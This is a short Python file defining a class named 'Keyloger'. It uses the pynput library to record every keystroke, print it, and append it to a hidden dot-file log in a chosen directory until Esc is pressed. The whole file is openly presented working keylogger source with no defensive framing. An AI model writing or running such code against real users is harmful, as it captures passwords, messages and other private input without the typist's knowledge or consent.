import pynput
from pynput.keyboard import Key, Listener

class Keyloger:
    def __init__(self):
        self.count = 0
        self.keys = []
        self.save_directory = "/"

    def OnPress(self, key):
        self.keys.append(key)
        self.count += 1
        print("{0} pressed".format(key))
        if self.count >= 1:
            self.count = 0
            self.WriteFile()
            self.keys = []

    def WriteFile(self):
        with open(self.save_directory + ".keyloger-log.txt", "a") as f:
            for key in self.keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write(' ')
                elif k.find("Key") == -1:
                    f.write(k)

    def OnRelease(self, key):
        if key == Key.esc:
            return False

    def Main(self, save_directory):
        self.save_directory = save_directory 
        with Listener(on_press = self.OnPress, on_release = self.OnRelease) as listener:
            listener.join()
